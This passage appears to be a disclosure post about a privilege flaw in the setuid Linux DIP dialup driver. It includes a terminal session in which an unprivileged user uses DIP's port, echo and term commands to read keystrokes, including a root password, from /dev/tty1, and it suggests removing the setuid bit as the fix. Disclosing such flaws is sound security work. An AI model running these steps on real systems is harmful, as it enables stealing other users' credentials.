@@ -1,0 +1,28 @@
+
+   I seem to have stumbled across another vulnerability in DIP.  It
+appears to allow any user to gain control of arbitrary devices in /dev.
+For instance, I have successfully stolen keystrokes from a root login as
+follows...  (I could also dump characters to the root console)
+
+$ whoami
+cesaro
+$ cat < /dev/tty1                    <------ root login here
+bash: /dev/tty1: Permission denied   <------ nope, we can see it
+$ dip -t
+DIP: Dialup IP Protocol Driver version 3.3.7o-uri (8 Feb 96)
+Written by Fred N. van Kempen, MicroWalt Corporation.
+
+DIP> port tty1
+DIP> echo on
+DIP> term
+[ Entering TERMINAL mode.  Use CTRL-] to get back ]
+roots_password                       <------ OH, maybe we *CAN* see it!
+[ Back to LOCAL mode. ]
+DIP> quit
+$
+
+I'm sure there are many more creative things to do with this, but this is
+the first thing that came to mind when I discovered it, and is a good
+example of what can be done.  Not all devices are accessible.  I have not
+looked into the patch at this time, but I recommend chmod u-s dip, as
+usual! :)
